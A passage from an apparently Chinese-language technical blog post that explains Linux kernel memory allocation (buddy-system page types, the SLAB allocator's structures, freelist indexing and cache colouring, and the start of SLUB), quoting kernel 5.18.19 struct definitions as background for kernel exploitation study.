CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">	MIGRATE_ISOLATE,	<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里定义了链表中内存块的属性：</p>
<blockquote>
<p>linux为了防止内存中产生过多的碎片，一般把页的类型分为三种：<br />
不可移动页：在内存中有固定位置，不能移动到其他地方。内核中使用的页大部分是属于这种类型。<br />
可回收页：不能直接移动，但可以删除，页中的内容可以从某些源中重新生成。例如，页内容是映射到文件数据的页就属于这种类型。对于这种类型，在内存短缺(分配失败)时，会发起内存回收，将这类型页进行回写释放。<br />
可移动页：可随意移动，用户空间的进程使用的没有映射具体磁盘文件的页就属于这种类型(比如堆、栈、shmem共享内存、匿名mmap共享内存)，它们是通过进程页表映射的，把这些页复制到新位置时，只要更新进程页表就可以了。一般这些页是从高端内存管理区获取。</p>
</blockquote>
<p>上面的每一个链表中保存的所有内存块的属性都是一样的。因此总的来看，伙伴系统可以表示为下图所示的结构：</p>
<p><img src="1.png" alt="" /><br />
其中枚举类型具体的含义我们只需要了解即可，在Kernel pwn中我们应该应对的最多的还是SLAB和SLUB系统。虽然SLAB系统正逐渐被SLUB替换，但还是有必要进行了解。</p>
<h1 id="2-slab系统介绍"><a class="markdownIt-Anchor" href="#2-slab系统介绍"></a> 2. SLAB系统介绍</h1>
<p>SLAB分配器建立在伙伴系统基础上，由于参考资料年代较为久远，部分源码与最近的Linux内核源码差距较大，因此不做解释，但影响不大。</p>
<p>在SLAB中，我们将可分配的内存块称之为<font color=red><strong>对象</strong></font>，一个分配器由结构体<code>kmem_cache</code>描述，结构如下（选自Linux 5.18.19版本内核）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> __<span class="title">percpu</span> *<span class="title">cpu_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 1) Cache tunables. Protected by slab_mutex */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> batchcount;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_buffer_size</span>;</span></span><br><span class="line"><span class="comment">/* 2) touched by every alloc &amp; free from the backend */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">slab_flags_t</span> flags;		<span class="comment">/* constant flags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> num;		<span class="comment">/* # of objs per slab */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3) cache_grow/shrink */</span></span><br><span class="line">	<span class="comment">/* order of pgs per slab (2^n) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> gfporder;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* force GFP flags, e.g. GFP_DMA */</span></span><br><span class="line">	<span class="type">gfp_t</span> allocflags;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> colour;			<span class="comment">/* cache colouring range */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> colour_off;	<span class="comment">/* colour offset */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">freelist_cache</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> freelist_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* constructor func */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4) cache creation/removal */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="type">int</span> refcount;</span><br><span class="line">	<span class="type">int</span> object_size;</span><br><span class="line">	<span class="type">int</span> align;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> num_active;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> num_allocations;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> high_mark;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> grown;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> reaped;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> errors;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> max_freeable;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_allocs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_frees;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_overflow;</span><br><span class="line">	<span class="type">atomic_t</span> allochit;</span><br><span class="line">	<span class="type">atomic_t</span> allocmiss;</span><br><span class="line">	<span class="type">atomic_t</span> freehit;</span><br><span class="line">	<span class="type">atomic_t</span> freemiss;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If debugging is enabled, then the allocator can add additional</span></span><br><span class="line"><span class="comment">	 * fields and/or padding to every object. &#x27;size&#x27; contains the total</span></span><br><span class="line"><span class="comment">	 * object size including these internal fields, while &#x27;obj_offset&#x27;</span></span><br><span class="line"><span class="comment">	 * and &#x27;object_size&#x27; contain the offset to the user object and its</span></span><br><span class="line"><span class="comment">	 * size.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<code>kmem_cache_node *node[MAX_NUMNODES]</code>中就保存有SLAB分配器中的一些核心结构，这里的<code>MAX_NUMNODES</code>在x86-64架构下的值为64：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">	<span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span>	<span class="comment">/* partial list first, better asm code */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> total_slabs;	<span class="comment">/* length of all slab lists */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> free_slabs;	<span class="comment">/* length of free slab list only */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> colour_next;	<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span>	<span class="comment">/* shared per node */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span>	<span class="comment">/* on other nodes */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> next_reap;	<span class="comment">/* updated without locking */</span></span><br><span class="line">	<span class="type">int</span> free_touched;		<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line">	<span class="type">atomic_long_t</span> total_objects;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里的<code>list_head</code>里面只保存了两个值：<code>next</code>指针和<code>prev</code>指针，也就是双向链表的经典结构。这里可以看到有三个双向链表：<code>slabs_partial</code>、<code>slabs_full</code>、<code>slabs_free</code>，分别保存的是<strong>内部有部分对象被分配的SLAB、内部所有对象都被分配的SLAB、内部所有对象都空闲的SLAB</strong>。这三个链表中的slab可以互相转化，如向一个所有对象都空闲的SLAB中申请空间成功后，这个SLAB就会从<code>slabs_free</code>移动到<code>slabs_partial</code>。</p>
<p>虽然文章开头参考的文章已经在一定程度上过时，但其中关于SLAB分配器的实现原理和思想却一直沿用至今。在5.18.19版本的<code>page</code>结构体中，已经找不到参考文章中的一些关键结构，不过这不影响我们对SLAB本身的分析。</p>
<p>下面是5.18.19版本内核的<code>slab</code>结构体声明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line">	<span class="type">void</span> *freelist;	<span class="comment">/* array of free object indexes */</span></span><br><span class="line">	<span class="type">void</span> *s_mem;	<span class="comment">/* first object */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line">			<span class="type">int</span> slabs;	<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">		&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line">	<span class="comment">/* Double-word boundary */</span></span><br><span class="line">	<span class="type">void</span> *freelist;		<span class="comment">/* first free object */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">			<span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">			<span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLOB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">	<span class="type">void</span> *__unused_1;</span><br><span class="line">	<span class="type">void</span> *freelist;		<span class="comment">/* first free block */</span></span><br><span class="line">	<span class="type">long</span> units;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> __unused_2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，历史版本中的诸如<code>s_mem</code>等关键控制结构体从<code>page</code>移到了<code>slab</code>中。由此，<code>page</code>结构体中也就不需要定义这些属性了。<code>s_mem</code>指向的是该SLAB分配器中的第一个对象，而<code>freelist</code>指向的是一个重要的标识对象使用情况的结构，我们接下来就会提到。这两个指针指向同一页中的不同地址，其中如果一个<code>page</code>被用作SLAB分配器，那么它的<code>virtual</code>（<code>page</code>中的最后一个属性）属性值与SLAB中的<code>freelist</code>指向相同地址。</p>
<p>关于SLAB内的分配机制，以下面一张图进行展示，其中需要注意的是：<strong>分配到哪一个对象不是外界能够决定的，而释放哪一个对象是外界能够决定的</strong>。如下图所示的分配方式能够最大限度保证分配到的对象是最近释放的。<strong><font color=red>在进行分配时，active读取其索引指向的值，并向前移动一位，在进行释放时，active首先回退一位，在将这一位对应的索引值修改为被释放的对象的索引值。</font></strong><br />
<img src="2.png" alt="" /><br />
在这种分配机制下，很容易判断一个SLAB中的对象究竟是全部分配，还是全部释放，还是部分分配。因为分配对应一次索引值前移，而释放对应一次索引值后移，只要索引值为0，这个SLAB就一定为空；只要索引值等于SLAB中对象的个数-1，这个SLAB就一定为满。</p>
<p>看到这里，我们对于SLAB的分配机制应该有了一个基本的认识，但是SLAB中还有一个<strong>染色</strong>的问题。有了上面的组织形式，SLAB已经能够作为一个成熟的内存分配器了，至于为什么要添加染色的机制，主要是为了性能的考虑：</p>
<blockquote>
<p>我们知道内存需要处理时要先放入CPU硬件高速缓存中，而CPU硬件高速缓存与内存的映射方式有多种。在同一个kmem_cache中所有SLAB都是相同大小，都是相同连续长度的页框组成，这样的话在不同SLAB中相同对象号对于页框的首地址的偏移量也相同，这样有很可能导致不同SLAB中相同对象号的对象放入CPU硬件高速缓存时会处于同一行，当我们交替操作这两个对象时，CPU的cache就会交替换入换出，效率就非常差。SLAB着色就是在同一个kmem_cache中对不同的SLAB添加一个偏移量，就让相同对象号的对象不会对齐，也就不会放入硬件高速缓存的同一行中，提高了效率。</p>
</blockquote>
<blockquote>
<p>着色空间就是前端的空闲区域，这个区有大小都是在分配新的SLAB时计算好的，计算方法很简单，node结点对应的kmem_cache_node中的colour_next乘上kmem_cache中的colour_off就得到了偏移量，然后colour_next++，当colour_next等于kmem_cache中的colour时，colour_next回归到0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">偏移量 = kmem_cache.colour_off * kmem_cache.node[NODE_ID].colour_next;</span><br><span class="line"></span><br><span class="line">kmem_cache.node[NODE_ID].colour_next++;</span><br><span class="line"><span class="keyword">if</span> (kmem_cache.node[NODE_ID].colour_next == kmem_cache.colour)</span><br><span class="line">    kmem_cache.node[NODE_ID].colour_next = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="3-slub系统介绍"><a class="markdownIt-Anchor" href="#3-slub系统介绍"></a> 3. SLUB系统介绍</h1>
<p>说完了SLAB，终于可以开始我们的重点——SLUB系统了。都说SLUB系统是SLAB的升级版，那么SLUB到底比SLAB升级在什么地方呢？</p>
<p>简单地来说，<strong>首先SLUB直接删掉了两个SLAB链表，即在SLAB节点中表示全空和全满的对象链表，只保留了一个部分满的SLAB链表。其次，在<code>slab</code>结构体内部也有很大的变化，删去了SLAB中指引内存分配的关键的数组结构和描述符数组，而只是使用一个指针形成链表，将所有空闲的对象串连在一起：</strong></p>
<p><img src="3.png" alt="" /><br />
（原文是有贴图的，但是在笔者的windows系统下加载不出来，在ubuntu倒是可以加载出来。上图选自<a target="_blank" rel="noopener" href="https://blog.csdn.net/wh8_2011/article/details/52287557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166522587916800182720892&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-52287557-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&amp;utm_term=slub&amp;spm=1018.2226.3001.4187">资料</a>）</p>
<p>注意slab和slub分别使用了不同的<code>kmem_cache</code>结构体，分别定义在<code>/include/linux/slab_def.h</code>和<code>/include/linux/slub_def.h</code>中。上面解释SLAB的时候使用的是<code>/include/linux/slab_def.h</code>的结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line">	<span class="type">slab_flags_t</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;	<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset;	<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line">	<span class="comment">/* Number of per cpu partial slabs to keep around */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial_slabs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="type">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="type">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在SLUB的<code>kmem_cache</code>中，有一个<code>kmem_cache_cpu</code>结构体指针，这是SLUB分配器的描述符：</p>
